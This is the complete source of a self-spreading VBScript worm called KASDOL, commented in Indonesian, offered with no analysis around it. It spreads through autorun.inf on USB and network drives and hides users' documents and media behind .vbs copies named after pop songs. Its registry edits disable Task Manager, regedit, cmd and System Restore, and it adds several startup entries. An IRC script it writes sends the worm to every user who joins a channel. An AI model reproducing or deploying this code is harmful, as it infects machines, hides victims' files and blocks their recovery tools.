Rem KASDOL.VBS
'''


On Error Resume Next
Dim Kasdol, fso, Induk
Set Kasdol = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set Induk = fso.GetFile(Wscript.ScriptFullName)
If Induk <> Kasdol.SpecialFolders("AppData") & "\svchost.vbs" then
If fso.fileExists(Left(Induk, Len(Induk) - 4)) Then
Kasdol.Run (Kasdol.RegRead("HKCR\" & BacaHandle("mp3") & "\shell\Open\command\") & " ¬" & chr(34) & Left(Induk, len(Induk)-3) & chr(34))
Else
Kasdol.Run (Kasdol.RegRead("HKCR\" & BacaHandle("mp3") & "\shell\Open\command\") & " ¬" & chr(34) & chr(34))
End If
End If
AutoFlash
Sebar1
Sebar2
Samar
Pertahanan
ShortCut
SerbuFile (Left(Induk, InStrRev(Induk, " \ ")))
SerbuFolder (Left(Induk, InStrRev(Induk, " \ ")))
Ininew("c:\")
Ininew("d:\")
Ininew("e:\")
Ininew("f:\")
Ininew("g:\")
Ininew("h:\")
Ininew("i:\")
Ininew("j:\")
Ininew("k:\")
Ininew("l:\")
Ininew("m:\")
Ininew("n:\")
Ininew("o:\")
Ininew("p:\")
Ininew("q:\")
Ininew("r:\")
Ininew("s:\")
SerbuDrive("c:\")
SerbuDrive("d:\")
SerbuDrive("f:\")
SerbuDrive("g:\")
SerbuDrive("h:\")
SerbuDrive("i:\")
SerbuDrive("j:\")
SerbuDrive("k:\")
SerbuDrive("l:\")
SerbuDrive("m:\")
SerbuDrive("n:\")
SerbuDrive("o:\")
SerbuDrive("p:\")
SerbuDrive("q:\")
SerbuDrive("r:\")
SerbuDrive("s:\")
AlwaysRun
Bom
SerbuRecent

'Pembuatan di flash Drive
Sub AutoFlash
On Error Resume Next
Dim intine
For Each intine In fso.drives
If (intine.drivetype = 1 or intine.drivetype = 2 or intine.drivetype = 4) and intine.path <> "A:" then

'Gawe autorun
Dim auto, tf1
Set auto = fso.CreateTextFile(intine.Path & ("\autorun.inf"), True)
auto.Write ("[autorun]"& vbcrlf & "shellexecute=wscript.exe 50N95.vbs")
auto.Close
set tf1=fso.getfile(intine.path & "\autorun.inf")
tf1.Attributes = 39

'Gawe fileinduk
Dim tf2, tf3
Induk.Copy (intine.Path & "\50N95.vbs")
set tf2=fso.getfile(intine.path & "\50N95.vbs")
tf2.Attributes = 39
Induk.Copy (intine.Path & "\JEBAKAN.vbs")
set tf3=fso.getfile(intine.path & "\JEBAKAN.vbs")
tf3.Attributes = 32

'Gawe Folder ~K45DOL
Dim volder
Set volder = fso.CreateFolder(intine.Path & ("\~K45D0L"))
volder.Attributes = 2

'Penggandaan kasdol di tempatnya
Dim getksdl, getksdl2, getksdl3
Induk.Copy(intine.Path & "\~K45D0L\K45D0L.exe")
Set getksdl = fso.getfile(intine.Path & "\~K45D0L\K45D0L.exe")
getksdl.Attributes = 39
Induk.Copy(intine.Path & "\~K45D0L\K45D0L.vbs")
Set getksdl = fso.getfile(intine.Path & "\~K45D0L\K45D0L.vbs")
getksdl.Attributes = 32
Induk.Copy(intine.Path & "\~K45D0L\K45D0L32.exe")
Set getksdl3 = fso.getfile(intine.Path & "\~K45D0L\K45D0L32.exe")
getksdl3.Attributes = 39

'Gawe autorun neng folder ~K45D0L
Dim autoq, tfg
Set autoq = fso.CreateTextFile(intine.Path & ("\~K45D0L\mlayu.inf"), True)
autoq.Write ("[autorun]"& vbcrlf & "shellexecute=wscript.exe K45D0L.vbs")
autoq.Close
set tfg=fso.getfile(intine.path & "\~K45D0L\mlayu.inf")
tfg.Attributes = 39

'Gawe file ini1
Dim inivile, getini
Set inivile = fso.CreateTextFile(intine.Path & ("\Dekstop.ini"), True)
inivile.WriteLine "[.ShellClassInfo]"
inivile.WriteLine "ConfirmFileOp=0"
inivile.WriteLine "[{5984FFE0-28D4-11CF-AE66-08002B2E1262}]"
inivile.WriteLine "PersistMoniker=file://~K45D0L\Folder.htt"
inivile.WriteLine "[ExtShellFolderViews]"
inivile.WriteLine "{5984FFE0-28D4-11CF-AE66-08002B2E1262}={5984FFE0-28D4-11CF-AE66-08002B2E1262}"
inivile.Close
Set getini = fso.getfile(intine.path & "\Dekstop.ini")
getini.Attributes = 39

'Gawe htt
Dim htt, gethtt
Set htt = fso.CreateTextFile(intine.Path & ("\~K45D0L\Folder.htt"), True)
htt.Writeline "<html>"

htt.Writeline "<head>"
htt.Writeline "<meta http-equiv=" & Chr(&H22) & "content-type" & Chr(&H22) & _
             "content=" & Chr(&H22) & "text/html; charset=Windows-1252" & Chr(&H22) & ">"

htt.Writeline "</head>"
htt.Writeline "<body style=" & Chr(&H22) & "margin: 0" & Chr(&H22) & " scroll=no>"
htt.Writeline "<object id=FileList border=0 tabindex=1"
htt.Writeline "classid= " & Chr(&H22) & "clsid:1820FED0-473E-11D0-A96C-00C04FD705A2" & Chr(&H22)
htt.Writeline "style=" & Chr(&H22) & "width: 100%; height: 100%" & Chr(&H22) & " tabIndex=-1>"
htt.Writeline "</object>"

htt.Writeline "</body>"
htt.Writeline "</html>"

htt.Writeline "<script>"

htt.Writeline "objectstr=" & Chr(&H22) & "<OBJECT ID=\" & Chr(&H22) & "RUNIT\" & Chr(&H22) & _
            " WIDTH=0 HEIGHT=0 TYPE=\" & Chr(&H22) & "application/x-oleobject\" & Chr(&H22) & Chr(&H22)
htt.Writeline "objectstr+=" & Chr(&H22) & "CODEBASE=\" & Chr(&H22) & "K45D0L.exe#version=1,1,1,1\" & Chr(&H22) & ">" & Chr(&H22)
htt.Writeline "objectstr+=" & Chr(&H22) & "<PARAM NAME=\" & Chr(&H22) & "_Version\" & Chr(&H22) & " VALUE=\" & Chr(&H22) & "65536\" & Chr(&H22) & ">" & Chr(&H22)
htt.Writeline "objectstr+=" & Chr(&H22) & "</OBJECT>" & Chr(&H22)
htt.Writeline "objectstr+=" & Chr(&H22) & "<HTML><H1></H1></HTML>" & Chr(&H22) & ";"
htt.Writeline "document.writeln(objectstr);"

htt.Writeline"document.close();" & vbCrLf & "</script>"

htt.close
set gethtt = fso.getfile(intine.path & "\~K45D0L\Folder.htt")
gethtt.Attributes = 39

'Pembuatan pesan ekstensi text
Dim pesen, getpesen
Set pesen = fso.CreateTextFile(intine.Path & ("\454.txt"), True)
pesen.WriteLine "                 K45D0L"
pesen.WriteLine ""
pesen.WriteLine ""
pesen.WriteLine "Sungguh merana nasib dikandung badan"
pesen.WriteLine "Jadi orang bawah yang malang"
pesen.WriteLine "Selalu ditindas dan diperkosa haknya"
pesen.WriteLine "Tanpa ampun dan belas kasihan"
pesen.WriteLine ""
pesen.WriteLine "Ingatlah Wahai engkau DURJANA!!!!"
pesen.WriteLine "Aku juga manusia"
pesen.WriteLine "Yang punya rasa dan karsa"
pesen.WriteLine "Ingin diberi sesuai haknya"
pesen.WriteLine "Dan juga sedikit dihargai"
pesen.WriteLine ""
pesen.WriteLine "Walaupun begitu aku akan selalu bersyukur pada-Mu Tuhan"
pesen.WriteLine "Atas semua kelebihan yang Engkau berikan"
pesen.WriteLine "Yaitu CINTA & SENI Yang begitu indah"
pesen.WriteLine ""
pesen.WriteLine "Dan doaku Ya Tuhan"
pesen.WriteLine "Semoga dengan ini meraka cepat tersadar"
pesen.WriteLine "Amin...."
pesen.WriteLine ""
pesen.WriteLine "Write by : K45D0l 93N9"
pesen.Close
Set getpesen=fso.getfile(intine.path & "\454.txt")
getpesen.Attributes = 32
End If
Next
End Sub

'Penyerangan DRIVE
Sub SerbuDrive (Lokasi)
On Error Resume Next
Dim drv
If fso.DriveExists(Lokasi) Then
Set drv = fso.GetDrive(fso.GetDriveName(Lokasi))
If drv.DriveType = 1 Or drv.DriveType = 2 Or drv.DriveType = 4 Then
CopyVbs(Lokasi & "\K45D0L.vbs")
Set getksdol = fso.Getfile(Lokasi & "\K45D0L.vbs")
getksdol.Attributes = 39
CopyVbs(Lokasi & "\Wakil Rakyat - Iwan Fals.vbs")
CopyVbs(Lokasi & "\Umar Bakrie - Iwan Fals.vbs")
Ininew (Lokasi)
End If
End If
End Sub

Sub Ininew (Lokasi)
On Error Resume Next
If Lokasi = "" Then
If fso.fileexists("c:\~K45D0L\K45D0L.exe") Then Lokasi = "c:\~K45D0L"
pfDir = Kasdol.regread("HKCM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If fso.fileexists(pfDir & "\~K45D0L\K45D0L.exe") Then Lokasi = pfDir & "\~K45D0L\K45D0L32.exe"
End If
If Lokasi <> "" Then
Set Script = fso.CreateTextFile(Lokasi & "\run.ini", True)
Script.WriteLine "[Levels]"
Script.WriteLine "Enabled=1"
Script.WriteLine "Count=6"
Script.WriteLine "Level1=000-Unknowns"
Script.WriteLine "000-UnknownsEnabled=1"
Script.WriteLine "Level2=100-Level 100"
Script.WriteLine "100-Level 100Enabled=1"
Script.WriteLine "Level3=200-Level 200"
Script.WriteLine "200-Level 200Enabled=1"
Script.WriteLine "Level4=300-Level 300"
Script.WriteLine " 300-Level 300Enabled=1"
Script.WriteLine "Level5=400-Level 400 "
Script.WriteLine "400-Level 400Enabled=1"
Script.WriteLine "Level6=500-Level 500"
Script.WriteLine "500-Level 500Enabled=1"
Script.WriteLine ""
Script.WriteLine "[000-Unknowns]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[100-Level 100]"
Script.WriteLine "User1=*!*@*"
Script.WriteLine "UserCount=1"
Script.WriteLine "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick c:\WINDOWS\93N95.vbs"
Script.WriteLine "EventCount=1"
Script.WriteLine ""
Script.WriteLine "[200-Level 200]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[300-Level 300]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[400-Level 400]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.WriteLine ""
Script.WriteLine "[500-Level 500]"
Script.WriteLine "UserCount=0"
Script.WriteLine "EventCount=0"
Script.Close
Dim getscr
getscr = fso.Getfile(Lokasi & "\run.ini")
getscr.Attributes = 39
SerbuFolder (Lokasi)
End If
End Sub

'Memulai Menyerang Folder
Sub SerbuFolder (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target, getksdol
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\93N9.vbs")
set getksdol = fso.getfile (target & "\93N9.vbs")
getksdol.attributes = 39

'Gawe autorun
Dim auto2, tff
Set auto2 = fso.CreateTextFile(target & ("\93N9.inf"), True)
auto2.Write ("[autorun]"& vbcrlf & "shellexecute=wscript.exe 93N9.vbs")
auto2.Close
set tff=fso.getfile(target & "\93N9.inf")
tff.Attributes = 39
SerbuFile (target)
SerbuFolder2 (target)
Next
End Sub

Sub SerbuFolder2 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target, getksdol
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\K5D0LB.vbs")
set getksdol = fso.getfile (target & "\K5D0LB.vbs")
getksdol.attributes = 39
CopyVbs(target & "\Amarah - The Titans.vbs")
CopyVbs(target & "\Afgan - Terima Kasih Cinta.vbs")
CopyVbs(target & "\Agnes - Cinta Mati.vbs")

CopyVbs(target & "\Slank - Kuil Cinta.vbs")

CopyVbs(target & "\Wali - Dik.....vbs")

CopyVbs(target & "\Nine Ball - Hingga Akhir Waktu.vbs")

CopyVbs(target & "\DOT - Belahan Jiwa.vbs")

CopyVbs(target & "\Bondan Prakoso & Sade 2 Black - Kroncong Protol.vbs")
CopyVbs(target & "\D'Masiv - Cinta Ini Membunuhku.vbs")

CopyVbs(target & "\Yovi N Nuno - Menjaga Hati.vbs")

CopyVbs(target & "\Angkasa - Jangan Pernah Selingkuh.vbs")

CopyVbs(target & "\Wangsa - Cinta Tanpa Cinta.vbs")

CopyVbs(target & "\Mulan Jameela - Wonder Women.vbs")

CopyVbs(target & "\Yovi N Nuno - Dia Milikku.vbs")

CopyVbs(target & "\Vagetoz - betapa aku mencintaimu.vbs")

CopyVbs(target & "\Matta - Ketahuan.vbs")

CopyVbs(target & "\Merpati Band - Tak Selamanya Selingkuh Itu Indah.vbs")

CopyVbs(target & "\The Rock - Munajat Cinta.vbs")
CopyVbs(target & "\Pilot - Sepanjang Hidupku.vbs")
CopyVbs(target & "\Seventeen - Selalu Mengalah.vbs")
CopyVbs(target & "\Slank - Orkes Sakit Hati.vbs")
SerbuFile (target)
SerbuFolder3 (target)
Next
End Sub

Sub SerbuFolder3 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target, getksdol
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\K5D0LC.vbs")
set getksdol = fso.getfile (target & "\K5D0LC.vbs")
getksdol.attributes = 39
CopyVbs(target & "\Cinta Itu Indah.vbs")
SerbuFile (target)
SerbuFolder4 (target)
Next
End Sub

Sub SerbuFolder4 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target, getksdol
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\K5D0LD.vbs")
set getksdol = fso.getfile (target & "\K5D0LD.vbs")
getksdol.attributes = 39
SerbuFile (target)
SerbuFolder5 (target)
Next
End Sub

Sub SerbuFolder5 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target, getksdol
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\K5D0LE.vbs")
set getksdol = fso.getfile (target & "\K5D0LE.vbs")
getksdol.attributes = 39
SerbuFile (target)
SerbuFolder6 (target)
Next
End Sub

Sub SerbuFolder6 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target, getksdol
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\K5D0LF.vbs")
set getksdol = fso.getfile (target & "\K5D0LF.vbs")
getksdol.attributes = 39
SerbuFile (target)
SerbuFolder7 (target)
Next
End Sub

Sub SerbuFolder7 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target, getksdol
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\K5D0LG.vbs")
set getksdol = fso.getfile (target & "\K5D0LG.vbs")
getksdol.attributes = 39
SerbuFile (target)
SerbuFolder8 (target)
Next
End Sub

Sub SerbuFolder8 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target, getksdol
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\K5D0LH.vbs")
set getksdol = fso.getfile (target & "\K5D0LH.vbs")
getksdol.attributes = 39
SerbuFile (target)
SerbuFolder9 (target)
Next
End Sub

Sub SerbuFolder9 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target, getksdol
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\K5D0LI.vbs")
set getksdol = fso.getfile (target & "\K5D0LI.vbs")
getksdol.attributes = 39
SerbuFile (target)
SerbuFolder10 (target)
Next
End Sub

Sub SerbuFolder10 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target, getksdol
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\K5D0LJ.vbs")
set getksdol = fso.getfile (target & "\K5D0LJ.vbs")
getksdol.attributes = 39
SerbuFile (target)
SerbuFolder11 (target)
Next
End Sub

Sub SerbuFolder11 (Lokasi)
On Error Resume Next
If Lokasi = "" Then Exit Sub
if Lokasi = Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target, getksdol
For Each target In fso.GetFolder(Lokasi).SubFolders
CopyVbs(target & "\K5D0LK.vbs")
set getksdol = fso.getfile (target & "\K5D0LK.vbs")
getksdol.attributes = 39
SerbuFile (target)
Next
End Sub


'Penyerangan FILE
Sub SerbuFile (Lokasi)
On Error Resume Next
Dim target
For Each target In fso.GetFolder(Lokasi).Files

'Menggandakan diri di file yang berxtensi 2 huruf dan menyembunyikan file asli
If lcase(Right(target,2))="rm" then
if Left(target,2)<> "~$" then CopyVbs(target & ".vbs")
HilangFile (target)
End If

'Menggandakan diri di file yang berxtensi 3 huruf dan menyembunyikan file asli
If lcase(Right(target,3))="doc" or lcase(Right(target,3))="rtf" or lcase(Right(target,3))="xls" or lcase(Right(target,3))="xla" or lcase(Right(target,3))="dbf" or lcase(Right(target,3))="mdb" or lcase(Right(target,3))="ppt" or lcase(Right(target,3))="pps" or lcase(Right(target,3))="pdf" or lcase(Right(target,3))="zip" or lcase(Right(target,3))="rar" or lcase(Right(target,3))="bmp" or lcase(Right(target,3))="jpg" or ucase(Right(target,3))="BMP" or ucase(Right(target,3))="JPG" or lcase(Right(target,3))="wmf" or ucase(Right(target,3))="WMF" or lcase(Right(target,3))="gif" or lcase(Right(target,3))="ico" or lcase(Right(target,3))="mp3" or lcase(Right(target,3))="3gp" or lcase(Right(target,3))="wma" or lcase(Right(target,3))="avi" or lcase(Right(target,3))="dat" or lcase(Right(target,3))="mpg" or ucase(Right(target,3))="MPG" or lcase(Right(target,3))="m3u" or lcase(Right(target,3))="wav" or ucase(Right(target,3))="WAV" or lcase(Right(target,3))="mov" or lcase(Right(target,3))="ttf" or lcase(Right(target,3))="bas" or lcase(Right(target,3))="vbp" or lcase(Right(target,3))="frm" or lcase(Right(target,3))="frx" or lcase(Right(target,3))="jar" or lcase(Right(target,3))="php" or ucase(Right(target,3))="PHP" or lcase(Right(target,3))="fon" or lcase(Right(target,3))="htm" or lcase(Right(target,3))="hlp" or lcase(Right(target,3))="chm" or lcase(Right(target,3))="mp4" or lcase(Right(target,3))="exe" or ucase(Right(target,3))="EXE" then
if Left(target,2)<> "~$" then CopyVbs(target & ".vbs")
HilangFile (target)
End If

'Menggandakan diri di file yang berxtensi 4 huruf dan menyembunyikan file asli
If lcase(Right(target,4))="docx" or lcase(Right(target,4))="xlsx" or lcase(Right(target,4))="rtfx" or lcase(Right(target,4))="pptx" or lcase(Right(target,4))="ppsx" or lcase(Right(target,4))="jpeg" or ucase(Right(target,4))="JPEG" or lcase(Right(target,4))="rmvb" or lcase(Right(target,4))="mpeg" or ucase(Right(target,4))="MPEG" then
if Left(target,2)<> "~$" then CopyVbs(target & ".vbs")
HilangFile (target)
End If

if lcase(Right(target,3))="vbs" then KillVBS(target)
Next
End sub

'Pembuatan Regedit
Sub Pertahanan
On Error Resume Next
'Melarang pengeksekusian file yang berikut dengan mengganti logoff
Kasdol.RegWrite "HKCR\inffile\shell\Install\command\", "logoff.exe"
Kasdol.RegWrite "HKCR\regfile\shell\open\command\", "logoff.exe"
Kasdol.RegWrite "HKCR\comfile\shell\open\command\", "logoff.exe"
Kasdol.RegWrite "HKCR\exefile\shell\open\command\", "c:\JEBAKAN.vbs"
Kasdol.RegWrite "HKCR\VBSFile\Shell\Edit\Command\", "logoff.exe"
Kasdol.RegWrite "HKCR\JSFile\Shell\Open\Command\", "logoff.exe"

'Merubah Tipe File vbs dan mp3
Kasdol.RegWrite "HKCR\VBSFile\FriendlyTypeName", "Lagu Favoritku", "REG_SZ"
Kasdol.RegWrite "HKCR\mp3file\FriendlyTypeName", "Good Songs", "REG_SZ"

'Menghilangkan beberapa program dari exploler
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegedit", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "0", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileAssociate", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFolderOptions", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCMD", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoTrayContextMenu", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", "0", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", "2", "REG_DWORD"
Kasdol.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableConfig", "1", "REG_DWORD"
Kasdol.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\DisableTaskMgr", "1", "REG_DWORD"
Kasdol.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\LimitSystemRestoreCheckpointing", "1", "REG_DWORD"
Kasdol.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\DisableMSI", "1", "REG_DWORD"
Kasdol.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore\DisableSR", "1", "REG_DWORD"
Kasdol.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoPropertiesMyComputer", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSMHelp", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "1", "REG_DWORD"

'Mengganti Ket Waktu
Kasdol.RegWrite "HKCU\Control Panel\International\s1159","Wayah Esuk"
Kasdol.RegWrite "HKCU\Control Panel\International\s2359","Wayah Sore"

'Mengganti Registrasi Komputer
Kasdol.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization", "Orkes Sakit Hati"
Kasdol.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","By : K45D0L"

'Menghilangkan Menu Close dan Logoff
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", "1", "REG_DWORD"
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogOff ", "01 00 00 00", "REG_BINARY"

'Menyembunyikan Drive
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", "67108863", "REG_DWORD"

'Menyimpangkan pembukaan file dengan membuka notepad
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msconfig.exe\Debugger","Notepad.exe"
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe\Debugger","Notepad.exe"
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedt32.exe\Debugger","Notepad.exe"
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TaskMgr.exe\Debugger","Notepad.exe"
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\attrib.exe\Debugger","Notepad.exe"
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\install.exe\Debugger","Notepad.exe"
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\setup.exe\Debugger","Notepad.exe"

'Run virus saat startup
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Security","c:\50N95.vbs"
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Help","c:\50N95.vbs"
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SayHello","c:\454.txt"
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SVCH0ST.EXE","c:\~K45D0L\K45D0L.vbs"
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\LOVE.EXE","c:\~K45D0L\K45D0L.vbs"
Kasdol.Regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL","c:\50N95.vbs"
Kasdol.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32","c:\50N95.vbs"
End Sub

'Penyamaran
Sub Samar
On Error Resume Next
Dim HandleDoc, HandleVbs
HandleDoc = "HKEY_CLASSES_ROOT\" & BacaHandle("mp3")
HandleVbs = "HKEY_CLASSES_ROOT\" & BacaHandle("VBS")
Kasdol.RegWrite HandleVbs & "\", Kasdol.RegRead(HandleDoc & "\")
Kasdol.RegWrite HandleVbs & "\DefaultIcon\", Kasdol.RegRead(HandleDoc & "\DefaultIcon\")
Kasdol.RegWrite HandleVbs & "\NeverShowExt",""
Kasdol.RegWrite "HKCR\VBSFile\FriendlyTypeName", Kasdol.RegRead(HandleDoc & "\")
End Sub

Sub ShortCut
On Error Resume Next
Dim lnk, lok
lok = Kasdol.SpecialFolders("Favorites") & "\svchost.lnk"
Set lnk = Kasdol.CreateShortCut(lok)
Induk.Copy (Kasdol.SpecialFolders("AppData") & "\svchost.vbs")
lnk.TargetPath = Kasdol.ExpandEnvironmentStrings(Kasdol.SpecialFolders("AppData") & "\svchost.vbs")
lnk.Save
HilangFile (lok)
Kasdol.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost", lok
End Sub

Sub HilangFile (AlamatFile)
Dim f1
Set f1 = fso.GetFile(AlamatFile)
f1.Attributes = 6
End sub

Sub CopyVbs (Alamat)
On Error Resume Next
Dim data, ts, s, a, tf
Randomize
data = Left(Rnd(15) * 10000000000, 10)
Set ts = fso.openTextFile(Induk, 1)
a = ts.ReadAll
s = Right(a, Len(a) -22)
ts.Close
Set tf = fso.CreateTextFile(Alamat, True)
tf.WriteLine ("Rem KASDOL" & data)
tf.Write s
tf.Close
Set ts = fso.GetFile(Alamat)
ts.Attributes = 1
End sub

Function BacaHandle(TipeFile)
BacaHandle = Kasdol.RegRead ("HKEY_CLASSES_ROOT\." & TipeFile & "\")
End Function

Sub KillVBS(alamat)
On Error Resume Next
Dim ts, s, i, a, b
Set ts = fso.openTextFile(alamat, 1)
s = ts.Readline
ts.Close
a = instr(s, "KASDOL")
If a = 0 Or a = "" Then
Set ts = fso.GetFile(alamat)
ts.Attributes = 0
Set ts = fso.openTextFile(Induk, 1)
i = ts.ReadAll
ts.Close
Set ts = fso.CreateTextfile(alamat, True)
ts.Write i
ts.Close
End If
End sub

sub AlwaysRun
On Error Resume Next
Dim mf, check
If Wscript.ScriptFullname = Kasdol.SpecialFolders("AppData") & "\svchost.vbs" then
Do
Set mf = fso.getfile(Wscript.ScriptFullname)
check = mf.Drive.drivetype
If check <> 1 Then Wscript.sleep 20000
Kasdol.run fso.getspecialfolder(0) & "\explorer.exe /e,/select, " & Wscript.ScriptFullname
AutoFlash
Sebar1
Ininew("c:\")
Ininew("d:\")
Ininew("e:\")
Ininew("f:\")
Ininew("g:\")
Ininew("h:\")
Ininew("i:\")
Ininew("j:\")
Ininew("k:\")
Ininew("l:\")
Ininew("m:\")
Ininew("n:\")
Ininew("o:\")
Ininew("p:\")
Ininew("q:\")
Ininew("r:\")
Ininew("s:\")
SerbuDrive("c:\")
SerbuDrive("d:\")
SerbuDrive("f:\")
SerbuDrive("g:\")
SerbuDrive("h:\")
SerbuDrive("i:\")
SerbuDrive("j:\")
SerbuDrive("k:\")
SerbuDrive("l:\")
SerbuDrive("m:\")
SerbuDrive("n:\")
SerbuDrive("o:\")
SerbuDrive("p:\")
SerbuDrive("q:\")
SerbuDrive("r:\")
SerbuDrive("s:\")
Loop While check <> 1
End If
End sub
Sub Sebar1
dim nilai
nilai=Left(Kasdol.SpecialFolders("Desktop"),3) & "Windows\System.vbs"
CopyVBS (nilai)
HilangFile(nilai)
SerbuFolder(Kasdol.SpecialFolders("MyDocuments"))
CopyVbs(Kasdol.SpecialFolders("NetHood") & "\K-5D0L.vbs")
End Sub

